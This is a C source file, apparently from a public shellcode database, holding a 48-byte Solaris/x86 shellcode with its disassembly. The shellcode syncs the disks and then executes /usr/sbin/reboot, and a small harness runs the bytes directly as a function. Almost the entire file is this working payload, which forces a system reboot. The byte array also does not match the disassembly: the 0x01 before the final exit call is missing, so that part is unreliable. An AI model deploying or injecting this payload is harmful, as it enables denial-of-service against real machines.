/*
 Title:   Solaris/x86 - Sync() & reboot() & exit(0) - 48 bytes
 Author:  Jonathan Salwan <submit AT shell-storm.org>
 Web:     http://www.shell-storm.org
 Twitter: http://twitter.com/jonathansalwan

 ! Database of shellcodes: http://www.shell-storm.org/shellcode/

 Date:    2010-06-07
 Tested:  SunOS opensolaris 5.11 snv_111b i86pc i386 i86pc Solaris

    0x8048074:              31 c0              xorl   %eax,%eax
    0x8048076:              b0 24              movb   $0x24,%al
    0x8048078:              cd 91              int    $0x91
    0x804807a:              31 c0              xorl   %eax,%eax
    0x804807c:              50                 pushl  %eax
    0x804807d:              68 62 6f 6f 74     pushl  $0x746f6f62
    0x8048082:              68 6e 2f 72 65     pushl  $0x65722f6e
    0x8048087:              68 2f 73 62 69     pushl  $0x6962732f
    0x804808c:              68 2f 75 73 72     pushl  $0x7273752f
    0x8048091:              89 e3              movl   %esp,%ebx
    0x8048093:              50                 pushl  %eax
    0x8048094:              53                 pushl  %ebx
    0x8048095:              89 e1              movl   %esp,%ecx
    0x8048097:              50                 pushl  %eax
    0x8048098:              51                 pushl  %ecx
    0x8048099:              53                 pushl  %ebx
    0x804809a:              b0 0b              movb   $0xb,%al
    0x804809c:              50                 pushl  %eax
    0x804809d:              cd 91              int    $0x91
    0x804809f:              31 db              xorl   %ebx,%ebx
    0x80480a1:              b0 01              movb   $0x1,%al
    0x80480a3:              cd 91              int    $0x91


*/

#include <stdio.h>

char sc[] = "\x31\xc0\xb0\x24\xcd\x91\x31\xc0\x50\x68"
            "\x62\x6f\x6f\x74\x68\x6e\x2f\x72\x65\x68"
            "\x2f\x73\x62\x69\x68\x2f\x75\x73\x72\x89"
            "\xe3\x50\x53\x89\xe1\x50\x51\x53\xb0\x0b"
            "\x50\xcd\x91\x31\xdb\xb0\xcd\x91";


int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(sc));
        (*(void(*)()) sc)();

return 0;
}